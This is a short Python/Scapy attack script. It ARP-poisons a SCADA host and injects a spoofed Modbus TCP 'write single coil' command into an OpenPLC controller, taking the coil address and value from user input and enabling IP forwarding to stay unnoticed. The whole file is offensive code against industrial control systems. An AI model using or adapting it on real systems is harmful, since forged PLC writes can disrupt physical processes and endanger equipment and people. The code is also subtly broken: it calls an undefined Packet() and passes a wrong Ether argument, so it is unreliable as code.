from scapy.all import *
from scapy.all import sendp
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP
from scapy.contrib.modbus import *
import struct, threading, os

# Enable IP forwarding (to avoid DoS)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

TargetIP = "192.168.163.130"
TargetPort = 502
SCADA_IP="192.168.254.20"
SCADA_MAC=input("Enter SCADA MAC: ")
OPLC_MAC=input("Enter OpenPLC MAC: ")
Coil_Address=int(input("Enter Coil address to attack"))
Output_Val=int(input("Enter 1 or 0 to write to coil: "))
# Destination
target_ip = "192.168.254.10"
target_port = 502  # Standard Modbus TCP port

def poison():
    arp_poison = ARP(op=2, pdst=SCADA_IP, psrc=TargetIP, hwdst=SCADA_MAC)
    sendp(arp_poison, iface="eth0", loop=True, inter=1)
# Build Modbus payload
def packet():
    modbus_packet = (
            IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
    # TCP 3-way if you want to be proper
    )

    # Raw Modbus payload (write coil at address )
    mb_payload = (
            ModbusADURequest(transId=RandShort(), unitId=1) /
            ModbusPDU05WriteSingleCoilRequest(outputAddress=Coil_Address, outputValue=Output_Val)
    )

    ether=Ether(src=SCADA_MAC, dest=OPLC_MAC)
    ip=IP(src=SCADA_IP, dst=target_ip)
    tcp=TCP(dport=target_port,sport=RandShort(),flags="PA")
    # Full TCP Modbus frame
    pkt = ether / ip / tcp / mb_payload

    # Send
    send(pkt)

threading.Thread(target=poison, daemon=True).start()

Packet()



